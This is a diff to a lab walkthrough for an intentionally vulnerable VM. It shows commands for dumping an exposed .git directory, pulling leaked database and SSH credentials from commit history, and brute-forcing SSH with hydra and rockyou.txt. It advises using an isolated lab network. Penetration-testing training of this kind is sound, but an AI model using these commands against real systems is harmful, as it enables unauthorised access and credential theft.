@@ -72,13 +72,43 @@ Two separate weaknesses need to be chained here:
 
 ### 2a. Exposed `.git` repository (initial access)
 
-The web root has a live `.git` directory. Dump it:
+The web root has a live `.git` directory. Dump it with a plain `git
+clone` (the target serves the dumb-HTTP `info/refs` data, so no extra
+tooling is required):
 
 ```bash
-git clone http://<target-ip>/.git greengrid-git-dump
+git clone http://<target-ip>/.git/ greengrid-git-dump
 cd greengrid-git-dump
 git log --all --oneline
 ```
+
+**If `git clone` reports "repository not found":** the target's
+`.git/info/refs` wasn't generated. On the target VM, run:
+
+```bash
+cd /var/www/html
+sudo git update-server-info
+sudo chmod -R o+r .git
+```
+
+Then retry the `git clone` from your attacker machine.
+
+**Alternative (no fix required on the target):** if you're on an
+attacker box with internet access, `git-dumper` recursively pulls the
+repo without needing dumb-HTTP support:
+
+```bash
+sudo apt install -y pipx
+pipx install git-dumper
+pipx ensurepath
+# open a new terminal, or run: source ~/.bashrc
+git-dumper http://<target-ip>/.git/ greengrid-git-dump
+```
+
+Note: `git-dumper` installs from PyPI, so this only works if your
+attacker VM has outbound internet access. On a fully isolated lab
+network (recommended), use the `git update-server-info` fix above
+instead.
 
 Walk the commit history — you'll find a commit titled something like
 *"backup config before password rotation"* that added
@@ -91,7 +121,7 @@ git show <commit-hash>:config.php.bak
 This reveals:
 - Database credentials (`gg_app` / `H0useplant!99`)
 - A comment referencing an on-call SSH fallback account:
-  `ggtech / Sprout2024`
+  `ggtech / sunshine`
 
 ### 2b. sudo misconfiguration (privilege escalation, confirmed later)
 
@@ -106,13 +136,16 @@ Try the leaked credentials over SSH:
 
 ```bash
 ssh ggtech@<target-ip>
-# password: Sprout2024
+# password: sunshine
 ```
 
 (You could also confirm the credential pair with `hydra` against the
-single known username, for practice with brute-force tooling:)
+single known username, for practice with brute-force tooling. On
+Kali, `rockyou.txt` ships gzipped — unzip it first if you haven't
+already:)
 
 ```bash
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
 hydra -l ggtech -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
 ```
 
@@ -230,4 +263,4 @@ general-purpose machine. When you're done with the lab session:
 3. If you don't need it again, delete the VM and its virtual disk
    entirely rather than repurposing it.
 4. Rotate/discard any credentials you typed into other tools while
-   practicing (e.g., don't reuse `Sprout2024` anywhere real).
+   practicing (e.g., don't reuse `sunshine` anywhere real).
